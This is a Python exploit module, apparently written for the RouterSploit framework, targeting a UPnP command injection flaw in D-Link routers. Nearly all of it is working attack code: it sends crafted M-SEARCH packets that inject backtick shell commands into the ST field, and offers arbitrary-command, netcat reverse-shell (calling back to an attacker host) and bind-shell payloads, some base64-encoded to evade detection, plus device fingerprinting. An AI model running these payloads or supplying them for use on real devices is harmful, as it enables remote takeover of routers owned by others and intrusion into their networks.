#!/usr/bin/env python3
"""
D-Link UPnP Remote Command Execution Exploit

A command injection vulnerability exists in multiple D-Link network products, allowing an attacker
to inject arbitrary commands via UPnP using a crafted M-SEARCH packet.

CVEs: CVE-2023-33625, CVE-2020-15893, CVE-2019-20215
"""

import socket
import time
import re
from typing import Optional, Dict, Any, List, Tuple
import requests
from requests.exceptions import RequestException, Timeout
import json
import base64
import struct
import random
import threading
import hashlib


class DLinkUPnPRCE:
    """
    Exploit for D-Link UPnP Remote Command Execution vulnerability.
    
    Targets multiple D-Link router models through UPnP command injection
    in the M-SEARCH packet's Search Target (ST) field.
    """
    
    def __init__(self) -> None:
        """Initialize the exploit with default configuration."""
        # Required options for RouterSploit GUI
        self.target: str = "192.168.1.1"
        self.port: int = 49152  # Changed from 1900 to 49152 where UPnP actually runs on this target
        self.timeout: int = 10
        
        # Exploit-specific options
        self.command: str = "id"
        self.payload_type: str = "basic"  # basic, reverse_shell, bind_shell
        self.lhost: str = "192.168.1.100"  # Local host for reverse shells
        self.lport: int = 4444
        
        # Advanced options
        self.threads: int = 1
        self.delay: float = 1.0
        self.user_agent: str = "UPnP/1.0 UPnP-Device-Host/1.0"
        
        # Vulnerability information
        self.name = "D-Link UPnP Remote Command Execution"
        self.description = "Exploits command injection in D-Link UPnP implementation"
        self.category = "exploits/routers/dlink"
        
        # Target tracking
        self.vulnerable_targets: List[str] = []
        self.exploit_results: Dict[str, Any] = {}

    def run(self) -> None:
        """
        Main execution method called by RouterSploit GUI.
        
        Raises:
            Exception: If exploitation fails
        """
        print(f"[*] D-Link UPnP RCE Exploit")
        print(f"[*] Target: {self.target}:{self.port}")
        print(f"[*] Command: {self.command}")
        print(f"[*] Payload: {self.payload_type}")
        print()
        
        try:
            # Skip discovery - go direct to exploitation like Metasploit
            print("[*] Attempting direct exploitation (like Metasploit module)...")
            
            # Generate and send exploit payload immediately
            print("[*] Generating exploit payload...")
            payload = self.generate_metasploit_style_payload()
            
            print("[*] Sending UPnP M-SEARCH exploit...")
            success = self.send_metasploit_style_exploit(payload)
            
            if success:
                print("[+] Exploit sent successfully!")
                print("[+] If target is vulnerable, command should execute")
                if self.payload_type == "reverse_shell":
                    print(f"[*] Check for reverse shell on {self.lhost}:{self.lport}")
                    print(f"[*] Run: nc -lvnp {self.lport}")
                elif self.payload_type == "bind_shell":
                    print(f"[*] Try to connect: nc {self.target} {self.lport}")
                else:
                    print(f"[*] Command '{self.command}' should execute on target")
            else:
                print("[-] Exploit failed to send")
                
        except Exception as e:
            print(f"[-] Exploit failed: {str(e)}")
            raise

    def discover_upnp_services(self) -> List[Dict[str, Any]]:
        """
        Discover UPnP services on the target.
        
        Returns:
            List of discovered UPnP service information
        """
        services = []
        
        try:
            # Create UDP socket for M-SEARCH
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            
            # Standard UPnP M-SEARCH request
            msearch_request = (
                "M-SEARCH * HTTP/1.1\r\n"
                f"HOST: {self.target}:{self.port}\r\n"
                "MAN: \"ssdp:discover\"\r\n"
                "ST: upnp:rootdevice\r\n"
                "MX: 3\r\n\r\n"
            ).encode('utf-8')
            
            # Send M-SEARCH request
            sock.sendto(msearch_request, (self.target, self.port))
            
            # Collect responses
            start_time = time.time()
            while time.time() - start_time < self.timeout:
                try:
                    data, addr = sock.recvfrom(1024)
                    response = data.decode('utf-8', errors='ignore')
                    
                    # Parse UPnP response
                    service_info = self.parse_upnp_response(response, addr)
                    if service_info:
                        services.append(service_info)
                        print(f"[+] Found UPnP service: {service_info.get('server', 'Unknown')}")
                        
                except socket.timeout:
                    break
                except Exception as e:
                    print(f"[-] Error receiving UPnP response: {e}")
                    break
            
            sock.close()
            
        except Exception as e:
            print(f"[-] UPnP discovery failed: {e}")
        
        return services

    def parse_upnp_response(self, response: str, addr: Tuple[str, int]) -> Optional[Dict[str, Any]]:
        """Parse UPnP M-SEARCH response."""
        try:
            lines = response.split('\r\n')
            headers = {}
            
            for line in lines[1:]:  # Skip first line (HTTP status)
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip().lower()] = value.strip()
            
            return {
                'address': addr[0],
                'port': addr[1],
                'server': headers.get('server', ''),
                'location': headers.get('location', ''),
                'st': headers.get('st', ''),
                'usn': headers.get('usn', ''),
                'headers': headers
            }
            
        except Exception:
            return None

    def check_vulnerability(self) -> bool:
        """
        Check if target is vulnerable to UPnP command injection.
        
        Returns:
            True if vulnerable, False otherwise
        """
        try:
            # Test with a harmless command injection
            test_payload = self.generate_test_payload()
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            
            # Send test payload
            sock.sendto(test_payload.encode('utf-8'), (self.target, self.port))
            
            # Look for response that indicates vulnerability
            try:
                data, addr = sock.recvfrom(1024)
                response = data.decode('utf-8', errors='ignore')
                
                # Check for indicators of command injection
                vulnerability_indicators = [
                    'uid=', 'gid=', 'Linux', 'BusyBox', 'sh:', 'command not found'
                ]
                
                for indicator in vulnerability_indicators:
                    if indicator in response:
                        return True
                        
            except socket.timeout:
                pass
            
            sock.close()
            
            # Try alternative detection methods
            return self.check_vulnerability_alternative()
            
        except Exception as e:
            print(f"[-] Vulnerability check failed: {e}")
            return False

    def check_vulnerability_alternative(self) -> bool:
        """Alternative vulnerability detection method."""
        try:
            # Check for known vulnerable D-Link models via HTTP
            http_targets = [
                f"http://{self.target}",
                f"http://{self.target}:80",
                f"http://{self.target}:8080"
            ]
            
            for target_url in http_targets:
                try:
                    response = requests.get(
                        target_url, 
                        timeout=self.timeout,
                        headers={'User-Agent': self.user_agent}
                    )
                    
                    # Check for D-Link identification in response
                    content = response.text.lower()
                    if any(pattern in content for pattern in ['d-link', 'dir-', 'dwr-', 'dap-']):
                        print(f"[+] Detected D-Link device via HTTP")
                        return True
                        
                except RequestException:
                    continue
            
            return False
            
        except Exception:
            return False

    def generate_test_payload(self) -> str:
        """Generate a harmless test payload to check for vulnerability."""
        # Use backticks for command substitution in UPnP ST field
        test_command = "`echo vulnerable_test_12345`"
        
        return (
            "M-SEARCH * HTTP/1.1\r\n"
            f"HOST: {self.target}:{self.port}\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            f"ST: {test_command}\r\n"
            "MX: 3\r\n\r\n"
        )

    def generate_payload(self) -> str:
        """
        Generate exploit payload based on configuration.
        
        Returns:
            Exploit payload string
        """
        if self.payload_type == "basic":
            return self.generate_basic_payload()
        elif self.payload_type == "reverse_shell":
            return self.generate_reverse_shell_payload()
        elif self.payload_type == "bind_shell":
            return self.generate_bind_shell_payload()
        else:
            return self.generate_basic_payload()

    def generate_basic_payload(self) -> str:
        """Generate basic command execution payload."""
        # Encode command to avoid detection
        encoded_cmd = base64.b64encode(self.command.encode()).decode()
        command_injection = f"`echo {encoded_cmd} | base64 -d | sh`"
        
        return (
            "M-SEARCH * HTTP/1.1\r\n"
            f"HOST: {self.target}:{self.port}\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            f"ST: {command_injection}\r\n"
            "MX: 3\r\n\r\n"
        )

    def generate_reverse_shell_payload(self) -> str:
        """Generate reverse shell payload."""
        # Create reverse shell command
        shell_cmd = f"nc {self.lhost} {self.lport} -e /bin/sh"
        encoded_cmd = base64.b64encode(shell_cmd.encode()).decode()
        command_injection = f"`echo {encoded_cmd} | base64 -d | sh &`"
        
        return (
            "M-SEARCH * HTTP/1.1\r\n"
            f"HOST: {self.target}:{self.port}\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            f"ST: {command_injection}\r\n"
            "MX: 3\r\n\r\n"
        )

    def generate_bind_shell_payload(self) -> str:
        """Generate bind shell payload."""
        # Create bind shell command
        shell_cmd = f"nc -l -p {self.lport} -e /bin/sh &"
        encoded_cmd = base64.b64encode(shell_cmd.encode()).decode()
        command_injection = f"`echo {encoded_cmd} | base64 -d | sh`"
        
        return (
            "M-SEARCH * HTTP/1.1\r\n"
            f"HOST: {self.target}:{self.port}\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            f"ST: {command_injection}\r\n"
            "MX: 3\r\n\r\n"
        )

    def send_exploit(self, payload: str) -> bool:
        """
        Send exploit payload to target.
        
        Args:
            payload: Exploit payload to send
            
        Returns:
            True if sent successfully, False otherwise
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            
            # Send exploit payload multiple times for reliability
            for i in range(3):
                sock.sendto(payload.encode('utf-8'), (self.target, self.port))
                time.sleep(self.delay)
                print(f"[*] Sent exploit attempt {i + 1}/3")
            
            sock.close()
            return True
            
        except Exception as e:
            print(f"[-] Failed to send exploit: {e}")
            return False

    def verify_exploitation(self) -> bool:
        """
        Verify if exploitation was successful.
        
        Returns:
            True if exploitation confirmed, False otherwise
        """
        print("[*] Verifying exploitation...")
        
        if self.payload_type == "reverse_shell":
            return self.verify_reverse_shell()
        elif self.payload_type == "bind_shell":
            return self.verify_bind_shell()
        else:
            return self.verify_basic_execution()

    def verify_reverse_shell(self) -> bool:
        """Verify reverse shell connection."""
        print(f"[*] Expecting reverse shell connection on {self.lhost}:{self.lport}")
        print("[*] Start a netcat listener: nc -lvnp {self.lport}")
        return True

    def verify_bind_shell(self) -> bool:
        """Verify bind shell availability."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.lport))
            sock.close()
            
            if result == 0:
                print(f"[+] Bind shell available on {self.target}:{self.lport}")
                return True
            else:
                print(f"[-] No bind shell detected on {self.target}:{self.lport}")
                return False
                
        except Exception as e:
            print(f"[-] Bind shell verification failed: {e}")
            return False

    def verify_basic_execution(self) -> bool:
        """Verify basic command execution."""
        print("[*] Command execution attempted")
        print("[*] Check target device manually for command output")
        print("[*] Consider using reverse/bind shell payloads for confirmation")
        return True

    def generate_metasploit_style_payload(self) -> str:
        """
        Generate payload exactly like the Metasploit module.
        
        Returns:
            Exploit payload string matching Metasploit format
        """
        # Use the exact same format as the Metasploit module
        if self.payload_type == "reverse_shell":
            # Simple netcat reverse shell
            cmd = f"nc {self.lhost} {self.lport} -e /bin/sh &"
        elif self.payload_type == "bind_shell":
            # Simple netcat bind shell
            cmd = f"nc -l -p {self.lport} -e /bin/sh &"
        else:
            # Basic command execution
            cmd = self.command
            
        # Format exactly like Metasploit: URN;`command`
        return f"urn:device:1;`{cmd}`"

    def send_metasploit_style_exploit(self, st_payload: str) -> bool:
        """
        Send exploit exactly like the Metasploit module.
        
        Args:
            st_payload: The ST field payload (URN;`command`)
            
        Returns:
            True if sent successfully, False otherwise
        """
        try:
            # Create UDP socket exactly like Metasploit
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            
            # Build M-SEARCH packet exactly like Metasploit module
            packet = (
                "M-SEARCH * HTTP/1.1\r\n"
                f"HOST:{self.target}:{self.port}\r\n"
                f"ST:{st_payload}\r\n"
                "MX:2\r\n"
                "MAN:\"ssdp:discover\"\r\n\r\n"
            )
            
            print(f"[*] Sending M-SEARCH packet to {self.target}:{self.port}")
            print(f"[*] ST field: {st_payload}")
            
            # Send the packet
            sock.sendto(packet.encode('utf-8'), (self.target, self.port))
            
            # Wait a moment for execution
            time.sleep(2)
            
            sock.close()
            return True
            
        except Exception as e:
            print(f"[-] Failed to send exploit: {e}")
            return False


# Required for RouterSploit GUI compatibility
if __name__ == "__main__":
    exploit = DLinkUPnPRCE()
    exploit.run() 